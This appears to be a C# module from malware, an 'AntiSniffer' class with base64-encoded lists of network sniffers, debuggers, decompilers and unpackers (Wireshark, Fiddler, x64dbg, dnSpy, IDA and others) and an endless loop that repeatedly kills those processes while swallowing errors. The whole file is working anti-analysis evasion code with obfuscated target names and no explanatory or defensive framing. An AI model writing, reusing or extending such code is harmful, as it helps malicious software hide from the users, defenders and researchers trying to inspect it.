using System.Collections.Generic;
using System.Threading;

namespace Complex;

public class AntiSniffer
{
	private static readonly List<string> AppFilter = new List<string>
	{
		Program.Base64Decode("aHR0cCBhbmFseXplciBzdGFuZC1hbG9uZQ=="),
		Program.Base64Decode("ZmlkZGxlcg=="),
		Program.Base64Decode("ZWZmZXRlY2ggaHR0cCBzbmlmZmVy"),
		Program.Base64Decode("ZmlyZXNoZWVw"),
		Program.Base64Decode("SUVXYXRjaCBQcm9mZXNzaW9uYWw="),
		Program.Base64Decode("ZHVtcGNhcA=="),
		Program.Base64Decode("d2lyZXNoYXJr"),
		Program.Base64Decode("d2lyZXNoYXJrIHBvcnRhYmxl"),
		Program.Base64Decode("c3lzaW50ZXJuYWxzIHRjcHZpZXc="),
		Program.Base64Decode("TmV0d29ya01pbmVy"),
		Program.Base64Decode("TmV0d29ya1RyYWZmaWNWaWV3"),
		Program.Base64Decode("SFRUUE5ldHdvcmtTbmlmZmVy"),
		Program.Base64Decode("dGNwZHVtcA=="),
		Program.Base64Decode("aW50ZXJjZXB0ZXI="),
		Program.Base64Decode("SW50ZXJjZXB0ZXItTkc="),
		Program.Base64Decode("b2xseWRiZw=="),
		Program.Base64Decode("eDY0ZGJn"),
		Program.Base64Decode("eDMyZGJn"),
		Program.Base64Decode("ZG5zcHk="),
		Program.Base64Decode("ZG5zcHkteDg2"),
		Program.Base64Decode("ZGU0ZG90"),
		Program.Base64Decode("aWxzcHk="),
		Program.Base64Decode("ZG90cGVlaw=="),
		Program.Base64Decode("ZG90cGVlazY0"),
		Program.Base64Decode("aWRhNjQ="),
		Program.Base64Decode("UkRHIFBhY2tlciBEZXRlY3Rvcg=="),
		Program.Base64Decode("Q0ZGIEV4cGxvcmVy"),
		Program.Base64Decode("UEVpRA=="),
		Program.Base64Decode("cHJvdGVjdGlvbl9pZA=="),
		Program.Base64Decode("TG9yZFBF"),
		Program.Base64Decode("cGUtc2lldmU="),
		Program.Base64Decode("TWVnYUR1bXBlcg=="),
		Program.Base64Decode("VW5Db25mdXNlckV4"),
		Program.Base64Decode("VW5pdmVyc2FsX0ZpeGVy"),
		Program.Base64Decode("Tm9GdXNlckV4"),
		Program.Base64Decode("Y2hlYXRlbmdpbmU=")
	};

	private static readonly List<string> DumpFilter = new List<string>
	{
		Program.Base64Decode("TmV0d29ya01pbmVy"),
		Program.Base64Decode("TmV0d29ya1RyYWZmaWNWaWV3"),
		Program.Base64Decode("SFRUUE5ldHdvcmtTbmlmZmVy"),
		Program.Base64Decode("dGNwZHVtcA=="),
		Program.Base64Decode("aW50ZXJjZXB0ZXI="),
		Program.Base64Decode("SW50ZXJjZXB0ZXItTkc=")
	};

	public static void SniffersKiller()
	{
		while (true)
		{
			try
			{
				for (int i = 0; i < AppFilter.Count; i++)
				{
					int index = i;
					for (int j = 0; j < DumpFilter.Count; j++)
					{
						int index2 = j;
						ProcessKiller.ClosingCycle(AppFilter[index], DumpFilter[index2]);
					}
				}
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}
}
